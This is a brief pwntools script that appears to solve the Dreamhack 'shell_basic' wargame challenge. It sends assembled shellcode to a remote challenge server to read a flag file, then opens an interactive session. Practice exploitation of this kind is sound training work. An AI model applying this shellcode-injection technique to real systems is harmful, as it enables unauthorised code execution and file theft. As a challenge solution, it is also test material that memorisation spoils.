from pwn import *
context.arch = "amd64"
#p = process('./shell_basic')
p = remote('host3.dreamhack.games', 17792)

shellcode = shellcraft.cat("/home/shell_basic/flag_name_is_loooooong")
payload = asm(shellcode)

p.sendlineafter(b':', payload)
p.interactive()